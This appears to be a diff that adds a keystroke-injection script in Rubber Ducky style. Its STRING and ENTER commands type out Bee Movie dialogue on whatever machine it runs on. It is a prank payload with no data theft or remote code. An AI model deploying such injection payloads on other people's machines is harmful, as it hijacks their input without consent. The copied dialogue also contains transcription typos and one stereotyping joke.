+STRING Triple blade?
+ENTER
+STRING Jump on! It's your only chance, bee!
+ENTER
+STRING Why does everything have
+ENTER
+STRING to be so doggone clean?!
+ENTER
+STRING How much do you people need to see?!
+ENTER
+STRING Open your eyes!
+ENTER
+STRING Stick your head out the window!
+ENTER
+STRING From NPR News in Washington,
+ENTER
+STRING I'm Carl Kasell.
+ENTER
+STRING But don't kill no more bugs!
+ENTER
+STRING Bee!
+ENTER
+STRING Moose blood guy!!
+ENTER
+STRING You hear something?
+ENTER
+STRING Like what?
+ENTER
+STRING Like tiny screaming.
+ENTER
+STRING Turn off the radio.
+ENTER
+STRING Whassup, bee boy?
+ENTER
+STRING Hey, Blood.
+ENTER
+STRING Just a row of honey jars, as far as the eye could see.
+ENTER
+STRING Wow!
+ENTER
+STRING I assume wherever this truck goes is where they're getting it. I mean, that honey's ours.
+ENTER
+STRING Bees hang tight. We're all jammed in.
+ENTER
+STRING It's a close community.
+ENTER
+STRING Not us, man. We on our own. Every mosquito on his own.
+ENTER
+STRING What if you get in trouble?
+ENTER
+STRING You a mosquito, you in trouble. Nobody likes us. They just smack. See a mosquito, smack, smack!
+ENTER
+STRING At least you're out in the world. You must meet girls.
+ENTER
+STRING Mosquito girls try to trade up, get with a moth, dragonfly. Mosquito girl don't want no mosquito.
+ENTER
+STRING You got to be kidding me!
+ENTER
+STRING Mooseblood's about to leave the building! So long, bee!
+ENTER
+STRING Hey, guys!
+ENTER
+STRING Mooseblood!
+ENTER
+STRING I knew I'd catch y'all down here.
+ENTER
+STRING Did you bring your crazy straw?
+ENTER
+STRING We throw it in jars, slap a label on it, and it's pretty much pure profit.
+ENTER
+STRING What is this place?
+ENTER
+STRING A bee's got a brain the size of a pinhead.
+ENTER
+STRING They are pinheads!
+ENTER
+STRING Pinhead.
+ENTER
+STRING Check out the new smoker.
+ENTER
+STRING Oh, sweet. That's the one you want. The Thomas 3000!
+ENTER
+STRING Smoker?
+ENTER
+STRING Ninety puffs a minute, semi-automatic. Twice the nicotine, all the tar. A couple breaths of this knocks them right out.
+ENTER
+STRING They make the honey, and we make the money.
+ENTER
+STRING "They make the honey, and we make the money"?
+ENTER
+STRING Oh, my!
+ENTER
+STRING What's going on? Are you OK?
+ENTER
+STRING Yeah. It doesn't last too long.
+ENTER
+STRING Do you know you're in a fake hive with fake walls?
+ENTER
+STRING Our queen was moved here. We had no choice.
+ENTER
+STRING This is your queen? That's a man in women's clothes! That's a drag queen!
+ENTER
+STRING What is this?
+ENTER
+STRING Oh, no!
+ENTER
+STRING There's hundreds of them!
+ENTER
+STRING Bee honey.
+ENTER
+STRING Our honey is being brazenly stolen on a massive scale!
+ENTER
+STRING This is worse than anything bears have done! I intend to do something.
+ENTER
+STRING Oh, Barry, stop.
+ENTER
+STRING Who told you humans are taking our honey? That's a rumor.
+ENTER
+STRING Do these look like rumors?
+ENTER
+STRING That's a conspiracy theory. These are obviously doctored photos. How did you get mixed up in this?
+ENTER
+STRING He's been talking to humans.
+ENTER
+STRING What? Talking to humans?!
+ENTER
+STRING He has a human girlfriend. And they make out!
+ENTER
+STRING Make out? Barry!
+ENTER
+STRING We do not.
+ENTER
+STRING You wish you could.
+ENTER
+STRING Whose side are you on?
+ENTER
+STRING The bees!
+ENTER
+STRING I dated a cricket once in San Antonio. Those crazy legs kept me up all night.
+ENTER
+STRING Barry, this is what you want to do with your life?
+ENTER
+STRING I want to do it for all our lives. Nobody works harder than bees!
+ENTER
+STRING Dad, I remember you coming home so overworked
+ENTER
+STRING your hands were still stirring. You couldn't stop.
+ENTER
+STRING I remember that.
+ENTER
+STRING What right do they have to our honey?
+ENTER
+STRING We live on two cups a year. They put it in lip balm for no reason whatsoever!
+ENTER
+STRING Even if it's true, what can one bee do?
+ENTER
+STRING Sting them where it really hurts.
+ENTER
+STRING In the face! The eye!
+ENTER
+STRING That would hurt.
+ENTER
+STRING No.
+ENTER
+STRING Up the nose? That's a killer.
+ENTER
+STRING There's only one place you can sting the humans, one place where it matters.
+ENTER
+STRING Hive at Five, The Hive's only full-hour action news source.
+ENTER
+STRING No more bee beards!
+ENTER
+STRING With Bob Bumble at the anchor desk. Weather with Storm Stinger. Sports with Buzz Larvi. And Jeanette Chung.
+ENTER
+STRING Good evening. I'm Bob Bumble.
+ENTER
+STRING And I'm Jeanette Ohung.
+ENTER
+STRING A tri-county bee, Barry Benson, intends to sue the human race for stealing our honey, packaging it and profiting from it illegally!
+ENTER
+STRING Tomorrow night on Bee Larry King, we'll have three former queens here in our studio, discussing their new book, classy Ladies, out this week on Hexagon.
+ENTER
+STRING Tonight we're talking to Barry Benson.
+ENTER
+STRING Did you ever think, "I'm a kid from The Hive. I can't do this"?
+ENTER
+STRING Bees have never been afraid to change the world.
+ENTER
+STRING What about Bee Oolumbus? Bee Gandhi? Bejesus?
+ENTER
+STRING Where I'm from, we'd never sue humans.
+ENTER
+STRING We were thinking of stickball or candy stores.
+ENTER
+STRING How old are you?
+ENTER
+STRING The bee community is supporting you in this case, which will be the trial of the bee century.
+ENTER
+STRING You know, they have a Larry King in the human world too.
+ENTER
+STRING It's a common name. Next week...
+ENTER
+STRING He looks like you and has a show and suspenders and colored dots...
+ENTER
+STRING Next week...
+ENTER
+STRING Glasses, quotes on the bottom from the guest even though you just heard 'em.
+ENTER
+STRING Bear Week next week! They're scary, hairy and here live.
+ENTER
+STRING Always leans forward, pointy shoulders, squinty eyes, very Jewish.
+ENTER
+STRING In tennis, you attack at the point of weakness!
+ENTER
+STRING It was my grandmother, Ken. She's 81.
+ENTER
+STRING Honey, her backhand's a joke!
+ENTER
+STRING I'm not gonna take advantage of that?
+ENTER
+STRING Quiet, please.
+ENTER
+STRING Actual work going on here.
+ENTER
+STRING Is that that same bee?
+ENTER
+STRING Yes, it is!
+ENTER
+STRING I'm helping him sue the human race.
+ENTER
+STRING Hello.
+ENTER
+STRING Hello, bee.
+ENTER
+STRING This is Ken.
+ENTER
+STRING Yeah, I remember you. Timberland, size ten and a half. Vibram sole, I believe.
+ENTER
+STRING Why does he talk again?
+ENTER
+STRING Listen, you better go 'cause we're really busy working.
+ENTER
+STRING But it's our yogurt night!
+ENTER
+STRING Bye-bye.
+ENTER
+STRING Why is yogurt night so difficult?!
+ENTER
+STRING You poor thing. You two have been at this for hours!
+ENTER
+STRING Yes, and Adam here has been a huge help.
+ENTER
+STRING Frosting...
+ENTER
+STRING How many sugars?
+ENTER
+STRING Just one. I try not to use the competition.
+ENTER
+STRING So why are you helping me?
+ENTER
+STRING Bees have good qualities. And it takes my mind off the shop. Instead of flowers, people are giving balloon bouquets now.
+ENTER
+STRING Those are great, if you're three.
+ENTER
+STRING And artificial flowers.
+ENTER
+STRING Oh, those just get me psychotic!
+ENTER
+STRING Yeah, me too.
+ENTER
+STRING Bent stingers, pointless pollination.
+ENTER
+STRING Bees must hate those fake things!
+ENTER
+STRING Nothing worse than a daffodil that's had work done.
+ENTER
+STRING Maybe this could make up for it a little bit.
+ENTER
+STRING This lawsuit's a pretty big deal.
+ENTER
+STRING I guess.
+ENTER
+STRING You sure you want to go through with it?
+ENTER
+STRING Am I sure? When I'm done with the humans, they won't be able to say, "Honey, I'm home," without paying a royalty!
+ENTER
+STRING It's an incredible scene here in downtown Manhattan, where the world anxiously waits, because for the first time in history, we will hear for ourselves if a honeybee can actually speak.
+ENTER
+STRING What have we gotten into here, Barry?
+ENTER
+STRING It's pretty big, isn't it?
+ENTER
+STRING I can't believe how many humans don't work during the day.
+ENTER
+STRING You think billion-dollar multinational food companies have good lawyers?
+ENTER
+STRING Everybody needs to stay behind the barricade.
+ENTER
+STRING What's the matter?
+ENTER
+STRING I don't know, I just got a chill.
+ENTER
+STRING Well, if it isn't the bee team.
+ENTER
+STRING You boys work on this?
+ENTER
+STRING All rise! The Honorable Judge Bumbleton presiding.
+ENTER
+STRING All right. Case number 4475,
+ENTER
+STRING Superior Court of New York,
+ENTER
+STRING Barry Bee Benson v. the Honey Industry is now in session.
+ENTER
+STRING Mr. Montgomery, you're representing the five food companies collectively?
+ENTER
+STRING A privilege.
+ENTER
+STRING Mr. Benson... you're representing all the bees of the world?
+ENTER
+STRING I'm kidding. Yes, Your Honor, we're ready to proceed.
+ENTER
+STRING Mr. Montgomery, your opening statement, please.
+ENTER
+STRING Ladies and gentlemen of the jury, my grandmother was a simple woman. Born on a farm, she believed it was man's divine right to benefit from the bounty of nature God put before us.
+ENTER
+STRING If we lived in the topsy-turvy world Mr. Benson imagines, just think of what would it mean.
+ENTER
+STRING I would have to negotiate with the silkworm for the elastic in my britches!
+ENTER
+STRING Talking bee!
+ENTER
+STRING How do we know this isn't some sort of holographic motion-picture-capture Hollywood wizardry?
+ENTER
+STRING They could be using laser beams! Robotics! Ventriloquism! Cloning! For all we know, he could be on steroids!
+ENTER
+STRING Mr. Benson?
+ENTER
+STRING Ladies and gentlemen, there's no trickery here. I'm just an ordinary bee. Honey's pretty important to me. It's important to all bees. We invented it! We make it. And we protect it with our lives.
+ENTER
+STRING Unfortunately, there are some people in this room who think they can take it from us 'cause we're the little guys!
+ENTER
+STRING I'm hoping that, after this is all over, you'll see how, by taking our honey, you not only take everything we have but everything we are!
+ENTER
+STRING I wish he'd dress like that all the time. So nice!
+ENTER
+STRING Call your first witness.
+ENTER
+STRING So, Mr. Klauss Vanderhayden of Honey Farms, big company you have.
+ENTER
+STRING I suppose so.
+ENTER
+STRING I see you also own Honeyburton and Honron!
+ENTER
+STRING Yes, they provide beekeepers for our farms.
+ENTER
+STRING Beekeeper. I find that to be a very disturbing term.
+ENTER
+STRING I don't imagine you employ any bee-free-ers, do you?
+ENTER
+STRING No.
+ENTER
+STRING I couldn't hear you.
+ENTER
+STRING No.
+ENTER
+STRING No. Because you don't free bees. You keep bees. Not only that, it seems you thought a bear would be an appropriate image for a jar of honey.
+ENTER
+STRING They're very lovable creatures. Yogi Bear, Fozzie Bear, Build-A-Bear.
+ENTER
+STRING You mean like this?
+ENTER
+STRING Bears kill bees!
+ENTER
+STRING How'd you like his head crashing through your living room?! Biting into your couch! Spitting out your throw pillows! OK, that's enough. Take him away.
+ENTER
+STRING So, Mr. Sting, thank you for being here. Your name intrigues me. Where have I heard it before?
+ENTER
+STRING I was with a band called The Police.
+ENTER
+STRING But you've never been a police officer, have you?
+ENTER
+STRING No, I haven't.
+ENTER
+STRING No, you haven't. And so here we have yet another example of bee culture casually stolen by a human for nothing more than a prance-about stage name.
+ENTER
+STRING Oh, please.
+ENTER
+STRING Have you ever been stung, Mr. Sting? Because I'm feeling a little stung, Sting. Or should I say... Mr. Gordon M. Sumner!
+ENTER
+STRING That's not his real name?! You idiots!
+ENTER
+STRING Mr. Liotta, first, belated congratulations on your Emmy win for a guest spot on ER in 2005.
+ENTER
+STRING Thank you. Thank you.
+ENTER
+STRING I see from your resume that you're devilishly handsome with a churning inner turmoil that's ready to blow.
+ENTER
+STRING I enjoy what I do. Is that a crime?
+ENTER
+STRING Not yet it isn't. But is this what it's come to for you? Exploiting tiny, helpless bees so you don't have to rehearse your part and learn your lines, sir?
+ENTER
+STRING Watch it, Benson! I could blow right now!
+ENTER
+STRING This isn't a goodfella.
+ENTER
+STRING This is a badfella!
+ENTER
+STRING Why doesn't someone just step on this creep, and we can all go home?!
+ENTER
+STRING Order in this court!
+ENTER
+STRING You're all thinking it!
+ENTER
+STRING Order! Order, I say!
+ENTER
+STRING Say it!
+ENTER
+STRING Mr. Liotta, please sit down!
+ENTER
+STRING I think it was awfully nice of that bear to pitch in like that. I think the jury's on our side.
+ENTER
+STRING Are we doing everything right, legally?
+ENTER
+STRING I'm a florist.
+ENTER
+STRING Right. Well, here's to a great team.
+ENTER
+STRING To a great team!
+ENTER
+STRING Well, hello.
+ENTER
+STRING Ken!
+ENTER
+STRING Hello.
+ENTER
+STRING I didn't think you were coming.
+ENTER
+STRING No, I was just late I tried to call, but... the battery.
+ENTER
+STRING I didn't want all this to go to waste,
+ENTER
+STRING so I called Barry. Luckily, he was free.
+ENTER
+STRING Oh, that was lucky.
+ENTER
+STRING There's a little left. I could heat it up.
+ENTER
+STRING Yeah, heat it up, sure, whatever.
+ENTER
+STRING So I hear you're quite a tennis player. I'm not much for the game myself. The ball's a little grabby.
+ENTER
+STRING That's where I usually sit. Right... there.
+ENTER
+STRING Ken, Barry was looking at your resume, and he agreed with me that eating with chopsticks isn't really a special skill.
+ENTER
+STRING You think I don't see what you're doing?
+ENTER
+STRING I know how hard it is to find the right job. We have that in common.
+ENTER
+STRING Do we?
+ENTER
+STRING Bees have 100 percent employment, but we do jobs like taking the crud out.
+ENTER
+STRING That's just what I was thinking about doing.
+ENTER
+STRING Ken, I let Barry borrow your razor for his fuzz. I hope that was all right.
+ENTER
+STRING I'm going to drain the old stinger.
+ENTER
+STRING Yeah, you do that.
+ENTER
+STRING Look at that.
+ENTER
+STRING You know, I've just about had it with your little Mind Games.
+ENTER
+STRING What's that?
+ENTER
+STRING Italian Vogue.
+ENTER
+STRING Mamma mia, that's a lot of pages.
+ENTER
+STRING A lot of ads.
+ENTER
+STRING Remember what Van said, why is your life more valuable than mine?
+ENTER
+STRING Funny, I just can't seem to recall that! I think something stinks in here!
+ENTER
+STRING I love the smell of flowers.
+ENTER
+STRING How do you like the smell of flames?!
+ENTER
+STRING Not as much.
+ENTER
+STRING Water bug! Not taking sides!
+ENTER
+STRING Ken, I'm wearing a Chapstick hat!
+ENTER
+STRING This is pathetic!
+ENTER
+STRING I've got issues!
+ENTER
+STRING Well, well, well, a royal flush!
+ENTER
+STRING You're bluffing.
+ENTER
+STRING Am I?
+ENTER
+STRING Surf's up, dude!
+ENTER
+STRING Poo water!
+ENTER
+STRING That bowl is gnarly. Except for those dirty yellow rings!
+ENTER
+STRING Kenneth! What are you doing?!
+ENTER
+STRING You know, I don't even like honey! I don't eat it!
+ENTER
+STRING We need to talk! He's just a little bee!
+ENTER
+STRING And he happens to be the nicest bee I've met in a long time!
+ENTER
+STRING Long time? What are you talking about?! Are there other bugs in your life?
+ENTER
+STRING  No, but there are other things bugging me in life. And you're one of them!
+ENTER
+STRING Fine! Talking bees, no yogurt night...
+ENTER
+STRING My nerves are fried from riding on this emotional roller coaster!
+ENTER
+STRING Goodbye, Ken.
+ENTER
+STRING And for your information, I prefer sugar-free, artificial sweeteners made by man!
+ENTER
+STRING I'm sorry about all that.
+ENTER
+STRING I know it's got an aftertaste! I like it!
+ENTER
+STRING I always felt there was some kind of barrier between Ken and me. I couldn't overcome it.
+ENTER
+STRING Oh, well.
+ENTER
+STRING Are you OK for the trial?
+ENTER
+STRING I believe Mr. Montgomery is about out of ideas.
+ENTER
+STRING We would like to call Mr. Barry Benson Bee to the stand.
+ENTER
+STRING Good idea! You can really see why he's considered one of the best lawyers...
+ENTER
+STRING Yeah.
+ENTER
+STRING Layton, you've gotta weave some magic with this jury, or it's gonna be all over.
+ENTER
+STRING Don't worry. The only thing I have to do to turn this jury around is to remind them of what they don't like about bees.
+ENTER
+STRING You got the tweezers?
+ENTER
+STRING Are you allergic?
+ENTER
+STRING Only to losing, son. Only to losing.
+ENTER
+STRING Mr. Benson Bee, I'll ask you what I think we'd all like to know.
+ENTER
+STRING What exactly is your relationship to that woman?
+ENTER
+STRING We're friends.
+ENTER
+STRING Good friends?
+ENTER
+STRING Yes.
+ENTER
+STRING How good? Do you live together?
+ENTER
+STRING Wait a minute... Are you her little... bedbug?
+ENTER
+STRING I've seen a bee documentary or two. From what I understand, doesn't your queen give birth to all the bee children?
+ENTER
+STRING Yeah, but...
+ENTER
+STRING So those aren't your real parents!
+ENTER
+STRING Oh, Barry...
+ENTER
+STRING Yes, they are!
+ENTER
+STRING Hold me back!
+ENTER
+STRING You're an illegitimate bee, aren't you, Benson?
+ENTER
+STRING He's denouncing bees!
+ENTER
+STRING Don't y'all date your cousins?
+ENTER
+STRING Objection!
+ENTER
+STRING I'm going to pincushion this guy!
+ENTER
+STRING Adam, don't! It's what he wants!
+ENTER
+STRING Oh, I'm hit!! Oh, lordy, I am hit!
+ENTER
+STRING Order! Order!
+ENTER
+STRING The venom! The venom is coursing through my veins! I have been felled by a winged beast of destruction! You see? You can't treat them like equals! They're striped savages! Stinging's the only thing they know! It's their way!
+ENTER
+STRING Adam, stay with me.
+ENTER
+STRING I can't feel my legs.
+ENTER
+STRING What Angel of Mercy will come forward to suck the poison from my heaving buttocks?
+ENTER
+STRING I will have order in this court. Order! Order, please!
+ENTER
+STRING The case of the honeybees versus the human race took a pointed Turn Against the bees yesterday when one of their legal team stung Layton T. Montgomery.
+ENTER
+STRING Hey, buddy.
+ENTER
+STRING Hey.
+ENTER
+STRING Is there much pain?
+ENTER
+STRING Yeah.
+ENTER
+STRING I... I blew the whole case, didn't I?
+ENTER
+STRING It doesn't matter. What matters is
+ENTER
+STRING you're alive. You could have died.
+ENTER
+STRING I'd be better off dead. Look at me.
+ENTER
+STRING They got it from the cafeteria downstairs, in a tuna sandwich. Look, there's a little celery still on it.
+ENTER
+STRING What was it like to sting someone?
+ENTER
+STRING I can't explain it. It was all... All adrenaline and then...and then ecstasy!
+ENTER
+STRING All right.
+ENTER
+STRING You think it was all a trap?
+ENTER
+STRING Of course. I'm sorry. I flew us right into this.
+ENTER
+STRING What were we thinking? Look at us. We're just a couple of bugs in this world.
+ENTER
+STRING What will the humans do to us if they win?
+ENTER
+STRING I don't know.
+ENTER
+STRING I hear they put the roaches in motels. That doesn't sound so bad.
+ENTER
+STRING Adam, they check in, but they don't check out!
+ENTER
+STRING Oh, my.
+ENTER
+STRING Could you get a nurse to close that window?
+ENTER
+STRING Why?
+ENTER
+STRING The smoke.
+ENTER
+STRING Bees don't smoke.
+ENTER
+STRING Right. Bees don't smoke.
+ENTER
+STRING Bees don't smoke!
+ENTER
+STRING But some bees are smoking.
+ENTER
+STRING That's it! That's our case!
+ENTER
+STRING It is? It's not over?
+ENTER
+STRING Get dressed. I've gotta go somewhere.
+ENTER
+STRING Get back to the court and stall. Stall any way you can.
+ENTER
+STRING And assuming you've done step correctly, you're ready for the tub.
+ENTER
+STRING Mr. Flayman.
+ENTER
+STRING Yes? Yes, Your Honor!
+ENTER
+STRING Where is the rest of your team?
+ENTER
+STRING Well, Your Honor, it's interesting. Bees are trained to fly haphazardly, and as a result, we don't make very good time.
+ENTER
+STRING I actually heard a funny story about...
+ENTER
+STRING Your Honor, haven't these ridiculous bugs taken up enough of this court's valuable time? How much longer will we allow these absurd shenanigans to go on?
+ENTER
+STRING They have presented no compelling evidence to support their charges against my clients, who run legitimate businesses.
+ENTER
+STRING I move for a complete dismissal of this entire case!
+ENTER
+STRING Mr. Flayman, I'm afraid I'm going to have to consider Mr. Montgomery's motion.
+ENTER
+STRING But you can't! We have a terrific case.
+ENTER
+STRING Where is your proof?
+ENTER
+STRING Where is the evidence?
+ENTER
+STRING Show me the smoking gun!
+ENTER
+STRING Hold it, Your Honor!
+ENTER
+STRING You want a smoking gun? Here is your smoking gun.
+ENTER
+STRING What is that?
+ENTER
+STRING It's a bee smoker!
+ENTER
+STRING What, this? This harmless little contraption? This couldn't hurt a fly, let alone a bee.
+ENTER
+STRING Look at what has happened to bees who have never been asked, "Smoking or non?" Is this what nature intended for us? To be forcibly addicted to smoke machines and man-made wooden slat work camps?
+ENTER
+STRING Living out our lives as honey slaves to the white man?
+ENTER
+STRING What are we gonna do?
+ENTER
+STRING He's playing the species card.
+ENTER
+STRING Ladies and gentlemen, please, free these bees!
+ENTER
+STRING Free the bees! Free the bees! Free the bees! Free the bees! Free the bees!
+ENTER
+STRING The court finds in favor of the bees!
+ENTER
+STRING Vanessa, we won!
+ENTER
+STRING I knew you could do it! High-five!
+ENTER
+STRING Sorry.
+ENTER
+STRING I'm OK! You know what this means?
+ENTER
+STRING All the honey will finally belong to the bees.
+ENTER
+STRING Now we won't have to work so hard all the time.
+ENTER
+STRING This is an unholy perversion of the balance of nature, Benson.
+ENTER
+STRING You'll regret this.
+ENTER
+STRING Barry, how much honey is out there?
+ENTER
+STRING All right. One at a time.
+ENTER
+STRING Barry, who are you wearing?
+ENTER
+STRING My sweater is Ralph Lauren, and I have no pants.
+ENTER
+STRING What if Montgomery's right?
+ENTER
+STRING What do you mean?
+ENTER
+STRING We've been living the bee way a long time, 27 million years.
+ENTER
+STRING Congratulations on your victory. What will you demand as a settlement?
+ENTER
+STRING First, we'll demand a complete shutdown of all bee work camps.
+ENTER
+STRING Then we want back the honey that was ours to begin with, every last drop.
+ENTER
+STRING We demand an end to the glorification of the bear as anything more than a filthy, smelly, bad-breath stink machine.
+ENTER
+STRING We're all aware of what they do in the woods.
+ENTER
+STRING Wait for my signal. Take him out.
+ENTER
+STRING He'll have nauseous for a few hours, then he'll be fine.
+ENTER
+STRING And we will no longer tolerate bee-negative nicknames...
+ENTER
+STRING But it's just a prance-about stage name!
+ENTER
+STRING ...unnecessary inclusion of honey in bogus health products and la-dee-da human tea-time snack garnishments.
+ENTER
+STRING Can't breathe.
+ENTER
+STRING Bring it in, boys!
+ENTER
+STRING Hold it right there! Good.
+ENTER
+STRING Tap it.
+ENTER
+STRING Mr. Buzzwell, we just passed three cups and there's gallons more coming!
+ENTER
+STRING I think we need to shut down!
+ENTER
+STRING Shut down? We've never shut down.
+ENTER
+STRING Shut down honey production!
+ENTER
+STRING Stop making honey!
+ENTER
+STRING Turn your key, sir!
+ENTER
+STRING What do we do now?
+ENTER
+STRING Cannonball!
+ENTER
+STRING We're shutting honey production!
+ENTER
+STRING Mission abort.
+ENTER
+STRING Aborting pollination and nectar detail.
+ENTER
+STRING Returning to base.
+ENTER
+STRING Adam, you wouldn't believe how much honey was out there.
+ENTER
+STRING Oh, yeah?
+ENTER
+STRING What's going on? Where is everybody?
+ENTER
+STRING Are they out celebrating?
+ENTER
+STRING They're home.
+ENTER
+STRING They don't know what to do. Laying out, sleeping in.
+ENTER
+STRING I heard your Uncle Carl was on his way to San Antonio with a cricket.
+ENTER
+STRING At least we got our honey back.
+ENTER
+STRING Sometimes I think, so what if humans liked our honey? Who wouldn't?
+ENTER
+STRING It's the greatest thing in the world! I was excited to be part of making it.
+ENTER
+STRING This was my new desk. This was my new job. I wanted to do it really well. And now...
+ENTER
+STRING Now I can't.
+ENTER
+STRING I don't understand why they're not happy.
+ENTER
+STRING I thought their lives would be better!
+ENTER
+STRING They're doing nothing. It's amazing.
+ENTER
+STRING Honey really changes people.
+ENTER
+STRING You don't have any idea what's going on, do you?
+ENTER
+STRING What did you want to show me?
+ENTER
+STRING This.
+ENTER
+STRING What happened here?
+ENTER
+STRING That is not the half of it.
+ENTER
+STRING Oh, no. Oh, my.
+ENTER
+STRING They're all wilting.
+ENTER
+STRING Doesn't look very good, does it?
+ENTER
+STRING No.
+ENTER
+STRING And whose fault do you think that is?
+ENTER
+STRING You know, I'm gonna guess bees.
+ENTER
+STRING Bees?
+ENTER
+STRING Specifically, me.
+ENTER
+STRING I didn't think bees not needing to make honey would affect all these things.
+ENTER
+STRING It's not just flowers. Fruits, vegetables, they all need bees.
+ENTER
+STRING That's our whole SAT test right there.
+ENTER
+STRING Take away produce, that affects the entire animal kingdom.
+ENTER
+STRING And then, of course...
+ENTER
+STRING The human species?
+ENTER
+STRING So if there's no more pollination, it could all just go south here, couldn't it?
+ENTER
+STRING I know this is also partly my fault.
+ENTER
+STRING How about a suicide pact?
+ENTER
+STRING How do we do it?
+ENTER
+STRING I'll sting you, you step on me.
+ENTER
+STRING That just kills you twice.
+ENTER
+STRING Right, right.
+ENTER
+STRING Listen, Barry... sorry, but I gotta get going.
+ENTER
+STRING I had to open my mouth and talk.
+ENTER
+STRING Vanessa?
+ENTER
+STRING Vanessa? Why are you leaving?
+ENTER
+STRING Where are you going?
+ENTER
+STRING To the final Tournament of Roses parade in Pasadena.
+ENTER
+STRING They've moved it to this weekend because all the flowers are dying.
+ENTER
+STRING It's the Last Chance I'll ever have to see it.
+ENTER
+STRING Vanessa, I just wanna say I'm sorry.
+ENTER
+STRING I never meant it to turn out like this.
+ENTER
+STRING I know. Me neither.
+ENTER
+STRING Tournament of Roses.
+ENTER
+STRING Roses can't do sports.
+ENTER
+STRING Wait a minute. Roses. Roses?
+ENTER
+STRING Roses!
+ENTER
+STRING Vanessa!
+ENTER
+STRING Roses?!
+ENTER
+STRING Barry?
+ENTER
+STRING Roses are flowers!
+ENTER
+STRING Yes, they are.
+ENTER
+STRING Flowers, bees, pollen!
+ENTER
+STRING I know.
+ENTER
+STRING That's why this is the last parade.
+ENTER
+STRING Maybe not.
+ENTER
+STRING Could you ask him to slow down?
+ENTER
+STRING Could you slow down?
+ENTER
+STRING Barry!
+ENTER
+STRING OK, I made a huge mistake.
+ENTER
+STRING This is a total disaster, all my fault.
+ENTER
+STRING Yes, it kind of is.
+ENTER
+STRING I've ruined the planet. I wanted to help you with the flower shop. I've made it worse.
+ENTER
+STRING Actually, it's completely closed down.
+ENTER
+STRING I thought maybe you were remodeling.
+ENTER
+STRING But I have another idea, and it's greater than my previous ideas combined.
+ENTER
+STRING I don't want to hear it!
+ENTER
+STRING All right, they have the roses, the roses have the pollen.
+ENTER
+STRING I know every bee, plant and flower bud in this park.
+ENTER
+STRING All we gotta do is get what they've got back here with what we've got.
+ENTER
+STRING Bees.
+ENTER
+STRING Park.
+ENTER
+STRING Pollen!
+ENTER
+STRING Flowers.
+ENTER
+STRING Repollination!
+ENTER
+STRING Across the nation!
+ENTER
+STRING Tournament of Roses, Pasadena, California.
+ENTER
+STRING They've got nothing but flowers, floats and cotton candy.
+ENTER
+STRING Security will be tight.
+ENTER
+STRING I have an idea.
+ENTER
+STRING Vanessa Bloome, FTD.
+ENTER
+STRING Official floral business. It's real.
+ENTER
+STRING Sorry, ma'am. Nice brooch.
+ENTER
+STRING Thank you. It was a gift.
+ENTER
+STRING Once inside, we just pick the right float.
+ENTER
+STRING How about The Princess and the Pea?
+ENTER
+STRING I could be the princess, and you could be the pea!
+ENTER
+STRING Yes, I got it.
+ENTER
+STRING Where should I sit?
+ENTER
+STRING What are you?
+ENTER
+STRING I believe I'm the pea.
+ENTER
+STRING The pea?
+ENTER
+STRING It goes under the mattresses.
+ENTER
+STRING Not in this fairy tale, sweetheart.
+ENTER
+STRING I'm getting the marshal.
+ENTER
+STRING You do that! This whole parade is a fiasco!
+ENTER
+STRING Let's see what this baby'll do.
+ENTER
+STRING Hey, what are you doing?!
+ENTER
+STRING Then all we do is blend in with traffic... without arousing suspicion.
+ENTER
+STRING Once at the airport, there's no stopping us.
+ENTER
+STRING Stop! Security.
+ENTER
+STRING You and your insect pack your float?
+ENTER
+STRING Yes.
+ENTER
+STRING Has it been in your possession the entire time?
+ENTER
+STRING Would you remove your shoes?
+ENTER
+STRING Remove your stinger.
+ENTER
+STRING It's part of me.
+ENTER
+STRING I know. Just having some fun.
+ENTER
+STRING Enjoy your flight.
+ENTER
+STRING Then if we're lucky, we'll have just enough pollen to do the job.
+ENTER
+STRING Can you believe how lucky we are? We have just enough pollen to do the job!
+ENTER
+STRING I think this is gonna work.
+ENTER
+STRING It's got to work.
+ENTER
+STRING Attention, passengers, this is Captain Scott. We have a bit of bad weather in New York. It looks like we'll experience a couple hours delay.
+ENTER
+STRING Barry, these are cut flowers with no water. They'll never make it.
+ENTER
+STRING I gotta get up there and talk to them.
+ENTER
+STRING Be careful.
+ENTER
+STRING Can I get help with the Sky Mall magazine? I'd like to order the talking inflatable nose and ear hair trimmer.
+ENTER
+STRING Captain, I'm in a real situation.
+ENTER
+STRING What'd you say, Hal?
+ENTER
+STRING Nothing.
+ENTER
+STRING Bee!
+ENTER
+STRING Don't freak out! My entire species...
+ENTER
+STRING What are you doing?
+ENTER
+STRING Wait a minute! I'm an attorney!
+ENTER
+STRING Who's an attorney?
+ENTER
+STRING Don't move.
+ENTER
+STRING Oh, Barry.
+ENTER
+STRING Good afternoon, passengers. This is your captain. Would a Miss Vanessa Bloome in 24B please report to the cockpit? And please hurry!
+ENTER
+STRING What happened here?
+ENTER
+STRING There was a DustBuster, a toupee, a life raft exploded.
+ENTER
+STRING One's bald, one's in a boat, they're both unconscious!
+ENTER
+STRING Is that another bee joke?
+ENTER
+STRING No!
+ENTER
+STRING No one's flying the plane!
+ENTER
+STRING This is JFK control tower, Flight 356. What's your status?
+ENTER
+STRING This is Vanessa Bloome. I'm a florist from New York.
+ENTER
+STRING Where's the pilot?
+ENTER
+STRING He's unconscious, and so is the copilot.
+ENTER
+STRING Not good. Does anyone onboard have flight experience?
+ENTER
+STRING As a matter of fact, there is.
+ENTER
+STRING Who's that?
+ENTER
+STRING Barry Benson.
+ENTER
+STRING From the honey trial?! Oh, great.
+ENTER
+STRING Vanessa, this is nothing more than a big metal bee.
+ENTER
+STRING It's got giant wings, huge engines.
+ENTER
+STRING I can't fly a plane.
+ENTER
+STRING Why not? Isn't John Travolta a pilot?
+ENTER
+STRING Yes.
+ENTER
+STRING How hard could it be?
+ENTER
+STRING Wait, Barry!
+ENTER
+STRING We're headed into some lightning.
+ENTER
+STRING This is Bob Bumble. We have some late-breaking news from JFK Airport, where a suspenseful scene is developing.
+ENTER
+STRING Barry Benson, fresh from his legal victory...
+ENTER
+STRING That's Barry!
+ENTER
+STRING ...is attempting to land a plane, loaded with people, flowers and an incapacitated flight crew.
+ENTER
+STRING Flowers?!
+ENTER
+STRING We have a storm in the area and two individuals at the controls with absolutely no flight experience.
+ENTER
+STRING Just a minute. There's a bee on that plane.
+ENTER
+STRING I'm quite familiar with Mr. Benson and his no-account compadres.
+ENTER
+STRING They've done enough damage.
+ENTER
+STRING But isn't he your only hope?
+ENTER
+STRING Technically, a bee shouldn't be able to fly at all.
+ENTER
+STRING Their wings are too small... Haven't we heard this a million times?
+ENTER
+STRING "The surface area of the wings and body mass make no sense."
